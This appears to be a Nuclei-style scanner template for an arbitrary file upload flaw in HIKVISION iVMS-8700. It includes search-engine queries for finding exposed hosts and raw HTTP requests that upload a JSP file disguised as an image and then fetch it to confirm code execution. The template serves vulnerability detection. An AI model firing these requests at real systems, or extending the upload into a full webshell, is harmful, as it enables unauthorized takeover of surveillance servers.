@@ -1,0 +1,48 @@
+id: HIKVISION
+
+info:
+  name: HIKVISION iVMS-8700 Comprehensive Security Management Platform 1 upload Webshell file
+  author: Zero Trust Security Attack and Defense Laboratory
+  severity: high
+  description: |
+    HIKVISION iVMS-8700 Comprehensive Security Management Platform 1 There is an arbitrary file upload vulnerability where attackers can control the server by sending specific request packets to upload Webshell files
+  metadata:
+    fofa-query: icon_hash="-911494769"
+    hunter-query: web.icon="3670cbb1369332b296ce44a94b7dd685"
+
+
+variables:
+  str1: '{{rand_base(6)}}'
+  str2: '{{rand_base(6)}}'
+  str3: '<%out.print("{{str2}}");%>'
+
+http:
+  - raw:
+      - |
+        POST /eps/resourceOperations/upload.action HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: MicroMessenger
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTJyhtTNqdMNLZLhj
+
+        ------WebKitFormBoundaryTJyhtTNqdMNLZLhj
+        Content-Disposition: form-data; name="fileUploader";filename="{{str1}}.jsp"
+        Content-Type: image/jpeg
+
+        {{str3}}
+        ------WebKitFormBoundaryTJyhtTNqdMNLZLhj--
+
+      - |
+        GET /eps/upload/{{res_id}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: json
+        name: res_id
+        json:
+          - ".data.resourceUuid"
+        internal: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - body_2 == str2
